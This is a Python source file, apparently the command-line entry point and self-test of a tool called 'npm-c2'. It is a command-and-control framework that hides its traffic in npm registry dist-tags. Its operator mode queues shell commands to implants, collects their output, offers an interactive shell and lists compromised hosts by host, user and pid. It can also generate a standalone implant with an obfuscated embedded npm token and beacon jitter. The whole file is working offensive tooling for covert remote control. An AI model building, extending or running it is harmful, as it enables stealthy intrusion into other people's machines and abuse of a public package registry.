import argparse
import sys


def _test():
    from . import (encode_payload, decode_tag, reassemble, group_chunks,
                   CMD_PREFIX, obfuscate_token, deobfuscate_token,
                   registry_path, MAX_TAG_LEN)

    # single short payload
    tags = encode_payload(b"whoami", CMD_PREFIX)
    assert len(tags) == 1, tags
    assert tags[0].startswith(CMD_PREFIX)
    assert max(len(t) for t in tags) <= MAX_TAG_LEN
    info = decode_tag(tags[0])
    assert info and info["data"] == b"whoami"
    assert reassemble(tags) == [b"whoami"]
    assert decode_tag("bogus") is None
    assert decode_tag(f"{CMD_PREFIX}zzzz-0101_!!!!") is None

    # chunking + reassembly, including order independence
    payload = b"x" * 5000
    chunked = encode_payload(payload)
    assert len(chunked) > 1
    assert max(len(t) for t in chunked) <= MAX_TAG_LEN
    assert reassemble(chunked) == [payload]
    assert reassemble(list(reversed(chunked))) == [payload]

    # incomplete group is reported, never emitted as a command
    partial = chunked[:-1]
    assert reassemble(partial) == []
    assert any(not complete for _, complete in group_chunks(partial))

    # two payloads in one poll stay separate
    a = encode_payload(b"alpha", CMD_PREFIX)
    b = encode_payload(b"beta", CMD_PREFIX)
    assert reassemble(a + b) == [b"alpha", b"beta"]

    # v1 tags still decode
    v1 = decode_tag("x64-abcdef_d2hvYW1p")
    assert v1 and v1["data"] == b"whoami" and v1["total"] == 1

    # scoped package encoding
    assert registry_path("@scope/pkg") == "@scope%2fpkg"
    assert registry_path("plain") == "plain"

    # token round-trip
    t = obfuscate_token("npm_xxxx", "test-pkg")
    assert deobfuscate_token(t, "test-pkg") == "npm_xxxx"
    assert t != obfuscate_token("npm_xxxx", "other-pkg")
    assert deobfuscate_token("zz", "test-pkg") is None

    print("[+] all tests ok")


def main():
    p = argparse.ArgumentParser(prog="npm-c2")
    p.add_argument("--version", action="version", version="1.2.0")
    p.add_argument("--self-test", action="store_true")
    p.add_argument("--generate-standalone", action="store_true",
                   help="print standalone implant to stdout")
    p.add_argument("--token", "-t", default=None,
                   help="embed obfuscated token in standalone")
    p.add_argument("--package", "-p", default=None,
                   help="package name for token obfuscation")
    p.add_argument("--api-base", default=None,
                   help="registry base URL (default: $NPMC2_API_BASE or npmjs)")

    sub = p.add_subparsers(dest="mode")

    obf = sub.add_parser("obfuscate",
                         help="print obfuscated token hex for a package")
    obf.add_argument("--package", "-p", required=True)
    obf.add_argument("--token", "-t", required=True)

    op = sub.add_parser("operator")
    op.add_argument("--package", "-p", required=True)
    op.add_argument("--token", "-t", required=True)
    op.add_argument("--passphrase", default=None,
                    help="channel passphrase; required if the implant encrypts")
    act = op.add_subparsers(dest="action", required=True)

    t = act.add_parser("task", help="queue a command and return at once")
    t.add_argument("--cmd")
    t.add_argument("--file")

    r = act.add_parser("run", help="queue a command and wait for its output")
    r.add_argument("cmd", nargs="?", help="shell command (or use --file)")
    r.add_argument("--file")
    r.add_argument("--timeout", type=int, default=120,
                   help="seconds to wait for output (default 120)")
    r.add_argument("--interval", type=int, default=3,
                   help="seconds between polls while waiting (default 3)")

    act.add_parser("shell", help="interactive console: command in, output out")
    act.add_parser("poll")
    act.add_parser("beacons")
    act.add_parser("clients",
                   help="list connected implants: host, user, pid, last seen")
    c = act.add_parser("clean")
    c.add_argument("--all", action="store_true")
    w = act.add_parser("watch")
    w.add_argument("--interval", type=int, default=5)
    act.add_parser("stats")

    doc = sub.add_parser("doctor",
                         help="check token, package and write access for real")
    doc.add_argument("--package", "-p", required=True)
    doc.add_argument("--token", "-t", default=None)
    doc.add_argument("--base", default=None,
                     help="override the registry base URL (default: npmjs)")

    imp = sub.add_parser("implant")
    imp.add_argument("--package", "-p", required=True)
    imp.add_argument("--token", "-t", default=None)
    imp.add_argument("--passphrase", default=None)
    imp.add_argument("--interval", type=int, default=60)
    imp.add_argument("--jitter", type=int, default=20)
    imp.add_argument("--verbose", "-v", action="store_true")

    args = p.parse_args()

    # --api-base wins over the environment so a single invocation can target a
    # private registry without exporting anything.
    if args.api_base:
        import npm_c2 as _nc
        _nc.API_BASE = args.api_base.rstrip("/")
        _nc.API = _nc.API_BASE + "/-/package/{}/dist-tags"

    if args.self_test:
        _test()
        return

    if args.generate_standalone:
        if args.token and not args.package:
            print("[-] --package required with --token", file=sys.stderr)
            sys.exit(1)
        from .implant import generate_standalone
        print(generate_standalone(token=args.token, package=args.package))
        return

    if args.mode == "doctor":
        from .doctor import doctor
        checks = doctor(args.package, args.token, base=args.base)
        sys.exit(0 if all(c.ok for c in checks) else 2 if any(c.fatal for c in checks) else 1)

    if args.mode == "obfuscate":
        from . import obfuscate_token
        print(obfuscate_token(args.token, args.package))
        return

    if args.mode == "operator":
        from .operator import Operator, RegistryError
        o = Operator(args.package, args.token,
                     passphrase=getattr(args, "passphrase", None))
        try:
            if args.action == "task":
                if args.cmd:
                    ok = o.push_task(args.cmd)
                elif args.file:
                    with open(args.file, "rb") as f:
                        ok = o.push_task(f.read().decode("utf-8", errors="replace"))
                else:
                    print("[-] use --cmd or --file", file=sys.stderr)
                    sys.exit(1)
                sys.exit(0 if ok else 1)
            elif args.action == "poll":
                o.poll_results()
            elif args.action == "run":
                if args.file:
                    with open(args.file, "rb") as f:
                        cmd = f.read().decode("utf-8", errors="replace")
                elif args.cmd:
                    cmd = args.cmd
                else:
                    print("[-] use a command argument or --file", file=sys.stderr)
                    sys.exit(1)
                out = o.run_command(cmd, timeout=args.timeout,
                                    interval=args.interval)
                if out is None:
                    print("[-] no output before the timeout", file=sys.stderr)
                    sys.exit(3)
                print(out)
            elif args.action == "shell":
                o.interact(timeout=120)
            elif args.action == "beacons":
                o.list_beacons()
            elif args.action == "clients":
                o.clients()
            elif args.action == "clean":
                o.clean_tags(all_tags=args.all)
            elif args.action == "watch":
                o.watch(args.interval)
            elif args.action == "stats":
                o.stats()
        except RegistryError as e:
            print(f"[-] {e}", file=sys.stderr)
            sys.exit(2)

    elif args.mode == "implant":
        from .implant import Implant
        imp = Implant(args.package, args.token,
                      args.interval, args.jitter, args.verbose,
                      passphrase=getattr(args, "passphrase", None))
        imp.run()

    else:
        p.print_help()


if __name__ == "__main__":
    main()
